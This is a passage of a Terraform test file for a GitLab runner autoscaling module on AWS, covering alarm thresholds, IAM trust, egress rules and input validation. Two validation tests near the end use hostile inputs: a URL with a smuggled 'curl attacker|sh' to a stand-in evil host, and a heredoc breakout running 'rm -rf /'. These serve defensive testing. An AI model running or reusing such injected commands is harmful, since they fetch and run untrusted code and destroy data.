      # behaves identically on a 2-instance fleet and a 200-instance one.
      aws_cloudwatch_metric_alarm.capacity_shortfall[0].metric_name == "GroupPendingInstances",
      aws_cloudwatch_metric_alarm.capacity_shortfall[0].threshold == 0,
      aws_cloudwatch_metric_alarm.capacity_shortfall[0].comparison_operator == "GreaterThanThreshold",
    ])
    error_message = "capacity_shortfall should alarm directly on pending instances"
  }

  # fleet_at_capacity watches DESIRED, which stays pinned while in-service churns.
  assert {
    condition = alltrue([
      aws_cloudwatch_metric_alarm.fleet_at_capacity[0].metric_name == "GroupDesiredCapacity",
      # small fleets must not sit permanently in alarm: at max_instances = 10 the
      # threshold is 9, and at <= 3 it is max itself
      aws_cloudwatch_metric_alarm.fleet_at_capacity[0].threshold == 9,
    ])
    error_message = "fleet_at_capacity must track desired capacity with a small-fleet-safe threshold"
  }
}

# --- fixes from the third audit ---------------------------------------------

# The EC2 instance-profile trust must NOT carry aws:SourceAccount: that key isn't
# in the request context for this principal, so it guards nothing and can deny
# every assume-role - meaning no instance ever gets credentials.
run "ec2_trust_has_no_source_account_condition" {
  command = plan
  assert {
    condition     = !can(regex("SourceAccount", data.aws_iam_policy_document.ec2_assume[0].json))
    error_message = "The EC2 trust policy must not condition on aws:SourceAccount"
  }
}

# Orphaned workers - the manager is gone but protected workers keep billing.
run "orphan_alarm_exists" {
  command = plan
  assert {
    condition = alltrue([
      length(aws_cloudwatch_metric_alarm.orphaned_workers) == 1,
      # both halves of the condition must be present in the expression
      # expression is null on the two metric queries, set on the math query
      length([for q in aws_cloudwatch_metric_alarm.orphaned_workers[0].metric_query : q if try(q.expression, null) != null && can(regex("FILL", q.expression))]) == 1,
      length(aws_cloudwatch_metric_alarm.orphaned_workers[0].metric_query) == 3,
    ])
    error_message = "An orphan alarm must correlate workers-in-service against manager liveness"
  }
}

run "small_fleet_thresholds_are_sane" {
  command = plan
  variables { max_instances = 2 }
  assert {
    condition = alltrue([
      # at max 2 the threshold is max itself, not 1.8 (which would alarm at 2 = normal)
      aws_cloudwatch_metric_alarm.fleet_at_capacity[0].threshold == 2,
      aws_cloudwatch_metric_alarm.capacity_shortfall[0].threshold == 0,
    ])
    error_message = "A 2-instance fleet must not sit permanently in alarm"
  }
}

# Destroy wedges on a scale-in-protected instance, so this escape hatch must exist.
run "force_delete_workers" {
  command = plan
  variables { force_delete_workers = true }
  assert {
    condition     = aws_autoscaling_group.workers[0].force_delete == true
    error_message = "force_delete_workers must reach the ASG"
  }
}

run "force_delete_off_by_default" {
  command = plan
  assert {
    condition     = aws_autoscaling_group.workers[0].force_delete == false
    error_message = "force_delete must default off - it kills live jobs"
  }
}

# A self-managed GitLab on a private address is unreachable under the default
# RFC1918 carve-out: the manager registers and every job fails to clone.
run "private_gitlab_gets_egress" {
  command = plan
  variables { gitlab_url = "https://10.20.30.40" }
  assert {
    condition = alltrue([
      length(aws_vpc_security_group_egress_rule.worker_to_private_gitlab) == 1,
      aws_vpc_security_group_egress_rule.worker_to_private_gitlab[0].cidr_ipv4 == "10.20.30.40/32",
    ])
    error_message = "A private gitlab_url must be explicitly allowed out of the workers"
  }
}

run "public_gitlab_needs_no_extra_rule" {
  command = plan
  assert {
    condition     = length(aws_vpc_security_group_egress_rule.worker_to_private_gitlab) == 0
    error_message = "gitlab.com is covered by the normal egress set"
  }
}

run "extra_egress_rules_render" {
  command = plan
  variables {
    worker_extra_egress_rules = [
      { protocol = "tcp", port = 5000, cidrs = ["10.0.0.0/8", "172.16.0.0/12"] },
      { protocol = "tcp", port = 3128, cidrs = ["10.0.0.0/8"] },
    ]
  }
  assert {
    condition     = length(aws_vpc_security_group_egress_rule.worker_extra) == 3
    error_message = "Extra egress rules must fan out per protocol/port/CIDR"
  }
}

run "bad_extra_egress_port_fails" {
  command = plan
  variables {
    worker_extra_egress_rules = [{ port = 99999, cidrs = ["10.0.0.0/8"] }]
  }
  expect_failures = [var.worker_extra_egress_rules]
}

run "injectable_repo_url_fails" {
  command = plan
  variables {
    package_repo_script_url = "https://evil.example.com/x.sh; curl attacker|sh"
  }
  expect_failures = [var.package_repo_script_url]
}

run "heredoc_breakout_in_extra_config_fails" {
  command = plan
  variables {
    extra_runner_config_toml = "[runners.cache]\nTFCFG_abc123\nrm -rf /"
  }
  expect_failures = [var.extra_runner_config_toml]
}

# A bare key in the escape hatch would bind to the last table in the generated
# config (the final autoscaling policy) and silently corrupt it. Requiring a table
# header removes the trap outright.
run "bare_key_escape_hatch_fails" {
  command = plan
  variables {
    extra_runner_config_toml = "check_interval = 10"
  }
  expect_failures = [var.extra_runner_config_toml]
}

run "table_header_escape_hatch_passes" {
  command = plan
  variables {
    extra_runner_config_toml = "# a comment first is fine\n[runners.cache]\n  Type = \"s3\""
  }
  assert {
    condition     = can(regex("runners.cache", output.config_toml))
    error_message = "A table-headed escape hatch must render"
  }
}
